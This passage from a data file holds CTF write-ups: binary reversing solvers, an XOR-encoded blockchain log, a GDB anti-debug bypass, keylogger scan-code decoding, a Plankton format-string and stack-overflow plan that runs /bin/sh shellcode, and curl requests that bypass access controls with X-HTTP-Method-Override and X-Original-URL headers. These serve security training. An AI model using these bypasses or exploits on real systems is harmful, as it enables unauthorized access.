1.</h2>\n<p>local_9 = ((xor_result >> 7) | (xor_result * 2)) & 0xFF</p>\n<h2>uVar1 = FUN_00401201(local_9,param_1);</h2>\n<p>return FUN_00401201(local_9, param_1)</p>\n<h2>--- 4. Decrypting the Flag ---</h2>\n<p>FLAG_BYTES = [] for i in range(32):     encoded_byte = ENCODED_FLAG[i]     key_byte = FUN_00401239(i)</p>\n<h2>InputByte = EncodedByte XOR KeyByte</h2>\n<p>flag_byte = encoded_byte ^ key_byte     FLAG_BYTES.append(flag_byte)</p>\n<h2>Convert bytes to the final ASCII string</h2>\n<p>final_flag = bytes(FLAG_BYTES).decode('ascii')</p>\n<h2>--- 5. Output ---</h2>\n<p>print(\"--- Calculated Solution ---\") print(f\"Required Input Length: 32 characters\") print(f\"Decrypted Flag (Hex):   {' '.join(f'{b:02X}' for b in FLAG_BYTES)}\") print(f\"Decrypted Flag (ASCII): {final_flag}\")  ```</p>\n<p>nexus{f0ll0w_7h3_ch4ng1ng_7r41l}</p>"
            },
            {
                "id": "huntme3",
                "title": "HuntMe3",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "buffer",
                    "reverse",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>We started with basic static analysis using <code>strings</code> to see if the flag was stored in plain text.</p>\n<p>Bash</p>\n<pre><code class=\"\">\nstrings ./HuntMe3 | grep \"nexus\"\n\n# No output\n\n</code></pre>\n<p>While we found strings like <code>\"CONGRATULATIONS, MASTER HUNTER\"</code> and <code>\"The forest grants you passage eternal\"</code>, the flag itself was not visible.</p>\n<p>Next, we used <code>ltrace</code> to intercept library calls, hoping for a <code>strcmp</code> or <code>memcmp</code> against the flag.</p>\n<p>Bash</p>\n<pre><code class=\"\">\nltrace ./HuntMe3\n\n</code></pre>\n<p><strong>Result:</strong> The trace showed <code>fgets</code> reading our input and <code>strlen</code> checking the length, but no comparison function was called on our input string. This indicated a custom comparison loop.</p>\n<h3>2. Static Analysis (Decompilation)</h3>\n<p>We opened the binary in Ghidra and analyzed the <code>main</code> function.</p>\n<ol>\n<li><strong>Input Reading:</strong> The program reads input into a buffer using <code>fgets</code>.</li>\n</ol>\n<ol>\n<li><strong>Validation Call:</strong> It passes the input to a function <code>FUN_00401367</code>.</li>\n</ol>\n<ul>\n<li>If this function returns <code>0</code>, we fail.</li>\n</ul>\n<ul>\n<li>If it returns <code>1</code>, we get the \"CONGRATULATIONS\" message.</li>\n</ul>\n<h4>Analyzing the Check Function (<code>FUN_00401367</code>)</h4>\n<p>Inside the validation function, we identified two critical checks:</p>\n<ol>\n<li><strong>Length Check:</strong></li>\n</ol>\n<p>C</p>\n<ul>\n<li>```</li>\n</ul>\n<p>sVar2 = strlen(param_1);     if (sVar2 == 0x35) { ... } // Length must be 53 characters     ```</p>\n<ul>\n<li><strong>The Shuffle & XOR Check:</strong> The core logic was inside a loop running 53 times:</li>\n</ul>\n<p>C</p>\n<ol>\n<li>```</li>\n</ol>\n<p>bVar1 = FUN_004012bc(local_c); // Generate a dynamic key byte     // Logic: Input[ShuffleArray[i]] ^ KeyByte == TargetArray[i]     if ((byte)(param_1[ShuffleArray[i]] ^ bVar1) != TargetArray[i]) return 0;     ```</p>\n<p>This revealed the equation we needed to reverse:</p>\n<p>Flag[Shuffle[i]]=Target[i]\u2295Key(i)</p>\n<h3>3. Dynamic Analysis (GDB)</h3>\n<p>The <code>ShuffleArray</code> and <code>TargetArray</code> were located at memory addresses <code>0x402040</code> and <code>0x402080</code>. Since initialization functions ran before the check, we used GDB to dump these values from memory at runtime.</p>\n<p><strong>GDB Commands used:</strong></p>\n<p>Code snippet</p>\n<pre><code class=\"\">\nbreak *0x401367   # Break at the validation function\n\nrun               # Run the program\n\nx/53bx 0x402040   # Dump 53 bytes of the Shuffle Array\n\nx/53bx 0x402080   # Dump 53 bytes of the Target Array\n\n</code></pre>\n<h3>4. Reversing the Key Generator</h3>\n<p>The key byte <code>bVar1</code> was generated by <code>FUN_004012bc</code>. This function used a complex sequence of additions and bitwise operations, including a helper function <code>FUN_004012a0</code>.</p>\n<p>Based on common CTF patterns and the context of bitwise operations, we hypothesized <code>FUN_004012a0</code> was a <strong>Rotate Left</strong> operation. We re-implemented the logic in Python.</p>\n<h3>5. Solution Script</h3>\n<p>We wrote a Python script to emulate the key generation, extract the arrays, and reverse the shuffle/XOR operation.</p>\n<p>Python</p>\n<pre><code class=\"\">\n# Solver for HuntMe3\n\n\n\n# 1. Data dumped from GDB\n\nshuffles = [\n\n    0x2d, 0x2c, 0x32, 0x14, 0x06, 0x25, 0x0f, 0x03, 0x22, 0x07, 0x2f, 0x23, 0x00, 0x31, 0x1c, 0x27,\n\n    0x10, 0x02, 0x30, 0x0a, 0x2a, 0x16, 0x05, 0x12, 0x1d, 0x01, 0x09, 0x17, 0x1b, 0x1f, 0x1a, 0x08,\n\n    0x0c, 0x24, 0x04, 0x20, 0x2e, 0x34, 0x0b, 0x26, 0x0e, 0x33, 0x15, 0x1e, 0x19, 0x29, 0x13, 0x11,\n\n    0x2b, 0x28, 0x21, 0x0d, 0x18\n\n]\n\n\n\ntargets = [\n\n    0xc7, 0x8e, 0x0b, 0xe5, 0x23, 0x81, 0x18, 0x23, 0x27, 0xed, 0x06, 0xa1, 0x19, 0x30, 0x38, 0xd0,\n\n    0x2e, 0x66, 0xe2, 0x26, 0x6e, 0x23, 0xaa, 0xa1, 0x5d, 0x7d, 0x36, 0xe5, 0x6c, 0x6d, 0x35, 0xa0,\n\n    0x34, 0x0c, 0xf9, 0x84, 0xd7, 0xc9, 0x5e, 0x56, 0xc2, 0xe9, 0x44, 0xe0, 0x77, 0x7b, 0x20, 0x78,\n\n    0x1f, 0xd9, 0x98, 0x85, 0xf5\n\n]\n\n\n\n# 2. Helper: Rotate Left (emulating FUN_004012a0)\n\ndef rotate_left(val, shift):\n\n    return ((val &lt;&lt; shift) | (val &gt;&gt; (32 - shift))) &amp; 0xFFFFFFFF\n\n\n\n# 3. Key Generator (emulating FUN_004012bc)\n\ndef generate_key(idx):\n\n    local_c = 0x7a8ab05c\n\n    local_10 = 0x362d12d2\n\n    local_14 = 0x1574b128\n\n    \n\n    for local_18 in range(idx + 1):\n\n        local_c = (local_c + 0xe868d9fc) &amp; 0xFFFFFFFF\n\n        local_10 = (local_10 + (local_18 * local_18)) &amp; 0xFFFFFFFF\n\n        local_14 = rotate_left(local_14, local_18 &amp; 7)\n\n\n\n    uVar1 = local_c ^ local_10 ^ (local_14 &gt;&gt; (idx &amp; 7))\n\n    uVar1 = (uVar1 &amp; 0xff) ^ ((uVar1 &amp; 0x1f) &lt;&lt; 3)\n\n    return (uVar1 ^ (uVar1 &gt;&gt; 5)) &amp; 0xFF\n\n\n\n# 4. Decrypting the Flag\n\nflag_list = [''] * 53\n\nfor i in range(53):\n\n    key = generate_key(i)\n\n    # Reverse the math: Target XOR Key = Input\n\n    original_char = chr(targets[i] ^ key)\n\n    \n\n    # Un-shuffle the character to its original position\n\n    if shuffles[i] &lt; 53:\n\n        flag_list[shuffles[i]] = original_char\n\n\n\nprint(\"\".join(flag_list))\n\n</code></pre>\n<h3>6. The Flag</h3>\n<p>Running the solver produced the correct flag:</p>\n<p><code>nexus{thr33_hunt5_c0mpl3t3_th3_f0r3st_gr4nts_p4ss4g3}</code></p>"
            },
            {
                "id": "plankton",
                "title": "Plankton",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "encoding",
                    "buffer",
                    "overflow",
                    "shellcode",
                    "stack",
                    "memory"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provides a 64-bit ELF binary <code>chall</code>. Protections:</p>\n<ul>\n<li>NX: Likely enabled (standard).</li>\n<li>PIE: Likely enabled (based on leaks).</li>\n<li>The binary uses a custom <code>mmap</code> region with RWX permissions.</li>\n</ul>\n<h3>Analysis</h3>\n<h4>1. Format String Vulnerability (Info Leak)</h4>\n<p>The function <code>process_input</code> reads input using <code>fgets</code> into a buffer at <code>rbp-0x3e0</code> and then prints it directly using <code>printf(buffer)</code>. This is a classic Format String vulnerability. We can use this to leak values from the stack.</p>\n<ul>\n<li>We need the address of the RWX memory region created in <code>main</code> via <code>mmap</code>.</li>\n<li>We need a \"key\" used for the obfuscation logic.</li>\n</ul>\n<p>By debugging with GDB (or trial and error), we identified:</p>\n<ul>\n<li><code>%7$p</code>: Leaks the address of the <code>mmap</code>ed region.</li>\n<li><code>%131$p</code>: Leaks a value where the MSB corresponds to the initial \"key\" byte used by the program.</li>\n</ul>\n<h4>2. Logic & Vulnerability</h4>\n<p>The program:</p>\n<ol>\n<li><code>mmap</code>s a region with RWX permissions (<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>).</li>\n<li>Calls <code>process_input</code> passing this mmap address.</li>\n<li><code>process_input</code> asks for a \"payload (hex)\".</li>\n<li>It parses the hex string and stores the bytes.</li>\n<li>It calls <code>obfuscated_copy</code>. This function XORs the input bytes with a pseudo-random key sequence and stores the result in a stack buffer at <code>rbp-0xa0</code>.</li>\n</ol>\n<ul>\n<li>Key update logic: <code>key = (key * 23 + 7) &amp; 0xFF</code>.</li>\n</ul>\n<ol>\n<li>Finally, it <code>memcpy</code>s the content of <code>rbp-0xa0</code> to the RWX mmap region.</li>\n</ol>\n<p><strong>The Flaw</strong>: The buffer <code>rbp-0xa0</code> is 160 bytes away from the saved RBP. The program allows reading up to 255 bytes (checked via a counter at <code>rbp-0x8</code>). Since 255 > 168 (distance to return address), we can overflow the buffer and overwrite the return address.</p>\n<h4>3. Obstacle: The Counter Variable</h4>\n<p>The counter variable (length of data) is located at <code>rbp-0x8</code>. The buffer starts at <code>rbp-0xa0</code>. The distance is <code>0xa0 - 0x8 = 152</code> bytes. When we fill the buffer to reach the return address (offset 168), we inevitably overwrite the counter at offset 152. If we corrupt this counter with garbage, the subsequent <code>memcpy</code> (which uses this counter as the size) might crash or copy the wrong amount of data. <strong>Solution</strong>: We must overwrite the counter with the correct total length of our payload (e.g., 176 bytes).</p>\n<h3>Exploit Strategy</h3>\n<ol>\n<li><strong>Leak Phase</strong>:</li>\n</ol>\n<ul>\n<li>Send <code>%7$p %131$p</code> to the first prompt.</li>\n<li>Parse the <code>mmap</code> address and the initial key.</li>\n</ul>\n<ol>\n<li><strong>Payload Construction</strong>:</li>\n</ol>\n<ul>\n<li><strong>Shellcode</strong>: Standard x64 shellcode (<code>execve(\"/bin/sh\", ...)</code>).</li>\n<li><strong>Padding</strong>: Fill with NOPs (<code>\\x90</code>) to reach offset 152.</li>\n<li><strong>Fix Counter</strong>: Insert the total payload length (p64(176)) at offset 152.</li>\n<li><strong>Padding</strong>: Fill 8 more bytes (for saved RBP) to reach offset 168.</li>\n<li><strong>Return Address</strong>: Overwrite with the address of the <code>mmap</code> region.</li>\n</ul>\n<ol>\n<li><strong>Encryption (Encoding)</strong>:</li>\n</ol>\n<ul>\n<li>Since the program XORs our input with the generated key sequence to produce the final data in memory, we must pre-XOR our payload with the *same* sequence.</li>\n<li><code>encoded_byte = payload_byte ^ key</code></li>\n<li><code>key = (key * 23 + 7) &amp; 0xFF</code></li>\n</ul>\n<ol>\n<li><strong>Sending</strong>:</li>\n</ol>\n<ul>\n<li>Convert the encoded payload to a hex string.</li>\n<li>Send it.</li>\n<li>The program decodes the hex, \"decrypts\" it (restoring our raw shellcode + ret addr), copies it to the RWX region, and returns.</li>\n<li>The return address now points to the RWX region containing our shellcode.</li>\n<li><strong>Shell!</strong></li>\n</ul>\n<h3>Flag</h3>\n<p><code>nexus{Pl4NK70n_F1nds_7h3_R3c3Ip3}</code></p>"
            },
            {
                "id": "silent-flag",
                "title": "Silent Flag",
                "category": "Miscellaneous",
                "tags": [
                    "cipher",
                    "xor"
                ],
                "writeup": "<h4>1. File Analysis</h4>\n<p>We are given four files representing a raw Ethereum event log export:</p>\n<ul>\n<li><code>abi.json</code>: Defines the event structure.</li>\n</ul>\n<ul>\n<li><code>topic0</code>: The Keccak-256 hash of the event signature.</li>\n</ul>\n<ul>\n<li><code>topic1</code>: The first indexed parameter.</li>\n</ul>\n<ul>\n<li><code>data</code>: The non-indexed parameters (ABI encoded).</li>\n</ul>\n<p><strong>The ABI Definition:</strong> The <code>abi.json</code> file reveals the specific event we are looking at:</p>\n<p>JSON</p>\n<pre><code class=\"\">\nEvent: Stored(bytes32 indexed id, bytes data)\n\n</code></pre>\n<ul>\n<li><code>id</code> is <strong>indexed</strong>, meaning it is stored in <code>topic1</code>.</li>\n</ul>\n<ul>\n<li><code>data</code> is <strong>not indexed</strong>, meaning it is stored in the <code>data</code> file.</li>\n</ul>\n<h4>2. Decoding the Log Data</h4>\n<p><strong>Analyzing <code>topic1</code> (The ID):</strong> The file content is <code>0x00...001337</code>.</p>\n<ul>\n<li>Value: <code>0x1337</code></li>\n</ul>\n<p><strong>Analyzing <code>data</code> (The Payload):</strong> The <code>data</code> file contains a continuous hex string. Since it is ABI encoded, we must parse it in 32-byte chunks:</p>\n<ol>\n<li><strong>Offset (Bytes 0-31):</strong> <code>0000...000020</code> -> <code>0x20</code> (32 decimal). This indicates the dynamic bytes start immediately after the length field.</li>\n</ol>\n<ol>\n<li><strong>Length (Bytes 32-63):</strong> <code>0000...00001c</code> -> <code>0x1c</code> (28 decimal). The flag is 28 characters long.</li>\n</ol>\n<ol>\n<li><strong>Content (Bytes 64-95):</strong> <code>59524f42444c6f07656803757e68730474077306797068050705024a</code> (+ padding)</li>\n</ol>\n<p><strong>Extracted Ciphertext:</strong> <code>59524f42444c6f07656803757e68730474077306797068050705024a</code></p>\n<h4>3. Decryption Logic</h4>\n<p>The extracted text is not readable ASCII. Given the context (CTF), we suspect a simple XOR cipher. We can derive the key using a \"Known Plaintext Attack\" assuming the flag format starts with <code>nexus</code>.</p>\n<ul>\n<li><strong>Ciphertext Byte 1:</strong> <code>0x59</code></li>\n</ul>\n<ul>\n<li><strong>Expected Plaintext Byte 1:</strong> <code>'n'</code> (<code>0x6E</code>)</li>\n</ul>\n<p>Key=0x59\u22950x6E=0x37</p>\n<p><strong>Verification:</strong> The value in <code>topic1</code> was <code>0x...1337</code>. The last byte is <code>0x37</code>. This confirms <code>0x37</code> is the intended key.</p>\n<h4>4. Solution Script</h4>\n<p>We can write a quick Python script to decode the byte string.</p>\n<p>Python</p>\n<pre><code class=\"\">\n# Extracted payload from the data file\n\ncipher_hex = \"59524f42444c6f07656803757e68730474077306797068050705024a\"\n\nciphertext = bytes.fromhex(cipher_hex)\n\n\n\n# Key derived from topic1 (last byte of 0x1337)\n\nkey = 0x37\n\n\n\n# XOR Decryption\n\nflag = \"\".join([chr(byte ^ key) for byte in ciphertext])\n\n\n\nprint(f\"Flag: {flag}\")\n\n</code></pre>\n<h4>5. Final Flag</h4>\n<p>Running the script yields:</p>\n<p><strong><code>nexus{X0R_4BI_D3C0D1NG_2025}</code></strong></p>"
            },
            {
                "id": "tarnished",
                "title": "Tarnished",
                "category": "Miscellaneous",
                "tags": [
                    "buffer",
                    "assembly",
                    "memory"
                ],
                "writeup": "<h3>1. Initial Reconnaissance</h3>\n<p>We started with a file named <code>tarnished</code>. First, we verified its type and permissions.</p>\n<p>Bash</p>\n<pre><code class=\"\">\n$ file tarnished\n\ntarnished: ELF 64-bit LSB executable, x86-64, ... (stripped)\n\n</code></pre>\n<p>The binary was <strong>stripped</strong>, meaning it had no debugging symbols (no function names like <code>main</code>). This required us to find the entry point manually.</p>\n<h3>2. Locating <code>main</code></h3>\n<p>Since we couldn't just <code>break main</code>, we found the entry point using GDB:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\ninfo file\n\n# Entry point: 0x4019c0\n\n</code></pre>\n<p>We examined the instructions at <code>0x4019c0</code> (<code>_start</code>) and looked for the standard C runtime initialization.</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\n0x4019df: call   0x403f70       &lt;__libc_start_main&gt;\n\n</code></pre>\n<p>The first argument passed to <code>__libc_start_main</code> (in the <strong>RDI</strong> register) is always the address of <code>main</code>.</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\n0x4019d8: mov    rdi, 0x401779\n\n</code></pre>\n<p>Thus, <strong><code>main</code> starts at <code>0x401779</code></strong>.</p>\n<h3>3. The Anti-Debug Mechanism</h3>\n<p>Inside <code>main</code>, we stepped through the code and found a critical check at <code>0x40181b</code>:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\n0x401811: mov    r14d, DWORD PTR [rip+0xaa358]\n\n0x401818: test   r14d, r14d\n\n0x40181b: je     0x40182c\n\n0x40181d: mov    edi, 0x4815e2  ; \"Debug detected! Exiting...\"\n\n0x401822: call   0x476b50       ; print and exit\n\n</code></pre>\n<p>The program checks a value loaded into <strong><code>r14</code></strong>. If <code>r14</code> is non-zero, it detects the debugger and exits. In our debugging session, <code>r14</code> was <code>1</code>.</p>\n<h3>4. The \"Twist\" (Why bypassing failed initially)</h3>\n<p>A common mistake (which we encountered) is to simply force the jump (<code>set $rip = 0x40182c</code>) or toggle the Zero Flag. While this bypasses the exit, it resulted in a <strong>garbage flag</strong>.</p>\n<p><strong>Why?</strong> Further analysis of the disassembly revealed that <strong><code>r14</code> is reused</strong> later in the decryption loop:</p>\n<p>Code snippet</p>\n<pre><code class=\"\">\n0x4018a4: movslq rcx, r14d    ; Move r14 into rcx (index)\n\n0x4018a7: inc    r14d         ; Increment r14\n\n...\n\n0x4018ae: mov    BYTE PTR [r8+rcx*1], sil\n\n</code></pre>\n<p>The register <code>r14</code> acts as the initial index/seed for generating the flag. By leaving it as <code>1</code> (from the failed check), the decryption algorithm was offset, producing corrupted text.</p>\n<h3>5. The Solution</h3>\n<p>To get the correct flag, we had to both <strong>fix the register state</strong> and <strong>bypass the check</strong>.</p>\n<ol>\n<li><strong>Start the program:</strong></li>\n</ol>\n<p>Code snippet</p>\n<ul>\n<li>```</li>\n</ul>\n<p>break *0x40181b  # The check     break *0x401997  # The end of decryption     run     ```</p>\n<ul>\n<li><strong>At the check (<code>0x40181b</code>), perform the fix:</strong></li>\n</ul>\n<p>Code snippet</p>\n<ul>\n<li>```</li>\n</ul>\n<p>set $r14 = 0        # Fix the key generation index     set $rip = 0x40182c # Teleport past the \"Debug detected\" exit     continue     ```</p>\n<ul>\n<li><strong>Read the flag:</strong> The program generates the flag in memory. When it hits the second breakpoint (<code>0x401997</code>), the flag buffer is pointed to by <strong>RBP</strong>.</li>\n</ul>\n<p>Code snippet</p>\n<ol>\n<li>```</li>\n</ol>\n<p>x/s $rbp     ```</p>\n<p><strong>Flag:</strong> <code>nexus{cl34r3d_1t_l1k3_4_pr0_m0v1n_0n_70_7h3_n3x7}</code></p>"
            },
            {
                "id": "the-scribe",
                "title": "The Scribe",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<h3>Overview</h3>\n<p>We are provided with a file named <code>dump.hex</code> containing a sequence of hexadecimal values. The goal is to decode these values to retrieve the flag.</p>\n<h3>Analysis</h3>\n<p>Upon inspecting the contents of <code>dump.hex</code>, the hex values appeared to correspond to keyboard scan codes. Specifically, they matched the <strong>PS/2 Scan Code Set 1</strong> (XT) protocol.</p>\n<p>Key observations:</p>\n<ul>\n<li>Values like <code>1E</code>, <code>1F</code>, <code>20</code> correspond to <code>a</code>, <code>s</code>, <code>d</code> keys.</li>\n<li>Values with the high bit set (e.g., <code>9E</code>, <code>9F</code>) represent \"Break\" codes (key releases), which correspond to the \"Make\" codes (key presses) plus <code>0x80</code>.</li>\n<li>Special keys like Shift (<code>0x2A</code>/<code>0x36</code>) modify the output character.</li>\n</ul>\n<h3>Solution</h3>\n<ol>\n<li><strong>Scripting the Decoder</strong>:</li>\n</ol>\n<p>I created a Python script to parse the hex dump. The script implemented a lookup map for PS/2 Set 1 scan codes.</p>\n<p>The core logic involved:</p>\n<ul>\n<li>Reading the hex values.</li>\n<li>Tracking the state of the \"Shift\" key (Left Shift <code>0x2A</code>, Right Shift <code>0x36</code>).</li>\n<li>Translating \"Make\" codes (key presses) into their ASCII equivalents.</li>\n<li>Ignoring \"Break\" codes (except for updating Shift state).</li>\n</ul>\n<ol>\n<li><strong>Decoding</strong>:</li>\n</ol>\n<p>Running the decoder on the provided <code>dump.hex</code> produced a stream of text resembling a user's typing history. It included Google searches (\"youtube: messi skills compilation\", \"python full course\"), chat messages, and coding fragments.</p>\n<ol>\n<li><strong>Finding the Flag</strong>:</li>\n</ol>\n<p>Scanning through the decoded text revealed the flag amidst the noise:</p>\n<p>``<code>    ...    echo 'saving credential dump' &gt; output.log    nexus{1_c4ptur3d_k3y5_wh1l3_w4tch1ng_m3551}    chmod +x exploit.py    ...    </code>``</p>\n<h3>Flag</h3>\n<p><code>nexus{1_c4ptur3d_k3y5_wh1l3_w4tch1ng_m3551}</code></p>"
            },
            {
                "id": "web-daveloper",
                "title": "Web Daveloper",
                "category": "Miscellaneous",
                "tags": [
                    "web",
                    "http",
                    "rop",
                    "stack",
                    "reverse"
                ],
                "writeup": "<p><strong>Initial Reconnaissance:</strong></p>\n<ol>\n<li>Accessed the main URL <code>http://ctf.nexus-security.club:3555</code>, which returned \"WELCOME TO THIS EASY CTF CHALLENGE\".</li>\n<li>The user provided hints about subdomains: <code>public</code> (400), <code>share</code> (400), <code>vault</code> (403).</li>\n<li>Attempted to access these as subdomains using DNS resolution and Host header manipulation, but they either failed to resolve or returned the default \"Welcome\" page.</li>\n</ol>\n<p><strong>Path-Based Discovery:</strong></p>\n<ol>\n<li>Discovered that accessing the paths <code>/public</code>, <code>/share</code>, and <code>/vault</code> on the main domain replicated the status codes provided by the user:</li>\n</ol>\n<ul>\n<li><code>GET http://ctf.nexus-security.club:3555/public</code> -> 400 Bad Request (\"Cannot GET directory\")</li>\n<li><code>GET http://ctf.nexus-security.club:3555/share</code> -> 400 Bad Request (\"Cannot GET directory\")</li>\n<li><code>GET http://ctf.nexus-security.club:3555/vault</code> -> 403 Forbidden</li>\n</ul>\n<p><strong>WebDAV Vulnerability (PROPFIND Method Override):</strong></p>\n<ol>\n<li>Performed an <code>OPTIONS</code> request on <code>/public</code> and <code>/vault</code>, which returned <code>Allow: GET, POST, OPTIONS</code>, <code>DAV: 1,2</code>, and <code>MS-Author-Via: DAV</code>. This indicated WebDAV functionality.</li>\n<li>Standard WebDAV methods (like <code>PROPFIND</code>) were not listed in <code>Allow</code> and resulted in <code>405 Method Not Allowed</code>.</li>\n<li>However, <code>PROPFIND</code> was successfully executed by using the <code>X-HTTP-Method-Override</code> header in a <code>POST</code> request:</li>\n</ol>\n<p><code>curl -v -X POST -H \"X-HTTP-Method-Override: PROPFIND\" -H \"Depth: 1\" http://ctf.nexus-security.club:3555/public</code>     This returned a custom XML structure listing files in the directory.</p>\n<p><strong>File Enumeration:</strong></p>\n<ol>\n<li>Using the <code>PROPFIND</code> method override with <code>Depth: 1</code>, the following files/directories were discovered:</li>\n</ol>\n<ul>\n<li><code>/</code>: <code>notes.txt</code>, <code>public</code>, <code>share</code>, <code>vault</code></li>\n<li><code>/public</code>: <code>index.html</code>, <code>readme.txt</code></li>\n<li><code>/share</code>: <code>index.html</code>, <code>info.txt</code></li>\n<li><code>/vault</code>: <code>flag.txt</code>, <code>secret.txt</code></li>\n</ul>\n<p><strong>Information Gathering from Readable Files:</strong></p>\n<ol>\n<li><code>http://ctf.nexus-security.club:3555/public/readme.txt</code> contained \"Public file\".</li>\n<li><code>http://ctf.nexus-security.club:3555/share/info.txt</code> contained \"Public info\".</li>\n<li><code>http://ctf.nexus-security.club:3555/notes.txt</code> contained \"mr7ba bik kho , rak 9riiiiiiiib\" (Welcome brother, you are very close), indicating the correct path.</li>\n</ol>\n<p><strong>Bypassing 403 Forbidden on <code>/vault/flag.txt</code>:</strong></p>\n<ol>\n<li>Attempts to <code>GET</code>, <code>COPY</code>, or <code>MOVE</code> <code>/vault/flag.txt</code> resulted in <code>403 Forbidden</code> or <code>405 Method Not Allowed</code>.</li>\n<li>Recognizing the \"bugbounty\" hint and the discrepancy in how HTTP headers are processed by different components of a web server stack (e.g., reverse proxy vs. application router), a common bypass technique involving <code>X-Original-URL</code> was attempted.</li>\n<li>The request was structured to target an *allowed* resource (<code>/notes.txt</code>) while including <code>X-Original-URL</code> header pointing to the *forbidden* resource (<code>/vault/flag.txt</code>).</li>\n</ol>\n<p><strong>Exploitation:</strong> <code>curl -H \"X-Original-URL: /vault/flag.txt\" http://ctf.nexus-security.club:3555/notes.txt</code></p>\n<p><strong>Result:</strong> The server responded with the content of <code>flag.txt</code>.</p>\n<p><strong>Flag:</strong> <code>nexus{w3bd4v_wchw3y4_h3d34rs_ezzzzzzzzz}</code></p>"
            }
        ]
    }
};